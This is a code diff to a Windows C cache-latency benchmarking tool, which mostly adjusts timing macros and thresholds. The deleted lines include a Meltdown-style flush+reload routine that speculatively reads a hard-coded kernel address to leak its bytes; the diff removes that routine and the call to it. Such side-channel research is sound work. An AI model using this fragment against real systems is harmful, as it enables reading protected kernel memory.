@@ -28,8 +28,8 @@ typedef unsigned __int64    U64;
 #define BS_IN_PTRS          (BS_IN_BYTES >> PTR_BITS)
 
 
-//#define rdtscp(ui)          __rdtscp(ui)
-#define rdtscp(ui)        (_mm_lfence(),__rdtsc())
+#define rdtscp(ui)          __rdtscp(ui)
+//#define rdtscp(ui)        (_mm_lfence(),__rdtsc())
 
 #define CALC_MIN(v, s, b)   if ((b) > (s) && (v) > ((b) - (s))) (v) = ((b) - (s))
 #define CALC_INITV          (MAXUINT64)
@@ -661,7 +661,7 @@ void cl_measure_cache_hierarchy()
 }
 
 #define CHL_WINDOWS   (14)   /* 1K to 8M */
-#define CHL_ASSOWAYS (64)
+#define CHL_ASSOWAYS  (64)
 void cl_measure_cache_ways()
 {
     U64 cscl[CHL_WINDOWS][CHL_ASSOWAYS], cscb[CHL_WINDOWS][CHL_ASSOWAYS];
@@ -926,21 +926,12 @@ void cl_measure_branchprediction2()
 
 
 #define N_STEP (4096)
-void cl_meltdown(PVOID addr)
+void cl_cache_footprint()
 {
     U32      counts[256];
     PUCHAR   data = g_ptr;
     register U32 j, k, t, m, ui;
     register U64 ts = 0, te = 0;
-    double   f = 1.0;
-
-    PVOID   steps[64];
-
-    for (m = 0; m < 64; m++ ) {
-        steps[m] = (PVOID)g_ptr;
-        g_ptr[m] = 0;
-    }
-    steps[63] = addr;
 
 
     for (j = 0; j < 16; j++) {
@@ -953,33 +944,13 @@ void cl_meltdown(PVOID addr)
             for (m = 0; m < 256; m++)
                 _mm_clflush(&data[m << 12]);
 
- //          k = data[j << 12];
-
-#if FALSE
-            for (m = 0; m < 64; m++) {
-                if (m < 63) {
-                    k = data[((unsigned char*)steps[m])[j] << 12];
-                }
-            }
-#endif
-
-#if TRUE
-            __try {
-                for (m = 0; m < 60; m++) {
-                    f = f * (te + 10) / (ts + 10);
-                    k = data[((unsigned char*)addr)[j] << 12];
-                }
-            } __except (EXCEPTION_EXECUTE_HANDLER) {
-            }
-#endif
+            k = data[j << 12];
 
             /* measure rdtscp latency */
             for (m = 0; m < 256; m++) {
                 ts = rdtscp(&ui);
                 k = data[m << 12];
                 te = rdtscp(&ui);
-                //LOGI("%I64u ", te - ts);
-                _mm_lfence();
                 if (te - ts < 60)
                     counts[m]++;
             }
@@ -987,18 +958,13 @@ void cl_meltdown(PVOID addr)
 
         LOGI("%u: ", j);
         for (m = 0; m < 256; m++) {
-            if (counts[m] * 100 ) { /* > N_LOOPS * 5 * 80 */
+            if (counts[m] * 100 > N_LOOPS * 5 * 80 ) {
                 LOGI(" %X (%u)", m, counts[m]);
             }
         }
         LOGI("\n");
     }      
 
-    if (!addr)
-        goto errorout;
-
-
-errorout:
     return;
 }
 
@@ -1008,6 +974,9 @@ void cl_fini()
         VirtualFree(g_raw, 0, MEM_RELEASE);
 }
 
+
+/* exeution:  start /realtime /affinity 2 CacheLatency.exe */
+
 int main()
 {
     /*
@@ -1015,10 +984,6 @@ int main()
      */
     if (cl_init() < 0)
         goto errorout;
-
-    cl_meltdown((PVOID)0xfffff8001c02000);
-
-    goto errorout;
 
     /*
      * measure instructions latency
